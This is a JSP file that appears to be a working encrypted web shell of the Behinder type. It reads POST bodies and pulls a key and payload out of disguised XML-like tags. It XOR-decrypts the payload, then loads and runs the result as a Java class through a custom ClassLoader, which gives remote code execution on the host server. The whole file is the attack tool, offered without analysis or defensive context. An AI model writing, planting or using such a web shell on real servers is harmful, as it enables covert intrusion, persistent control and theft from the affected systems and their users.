<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
private byte[] Decrypt(byte[] data) throws Exception
{
    String data64 = new String(data);
    int index1 = data64.indexOf("<arg0>");
    int index2 = data64.indexOf("</arg0>");
    String key64 = data64.substring(index1+6,index2);
    byte[] key = java.util.Base64.getDecoder().decode(key64);
    index1 = data64.indexOf("<condition>");
    index2 = data64.indexOf("</condition>");
    String getrealdata64=data64.substring(index1+11,index2);
	byte[] realdata = java.util.Base64.getDecoder().decode(getrealdata64);
	for (int i = 0; i < realdata.length; i++) {
		realdata[i] =  (byte)  ((realdata[i]) ^ (key[(i+12)%key.length]));
	}
	return realdata;
}
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性
            out.clear();
            out=pageContext.pushBody();
            */
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%>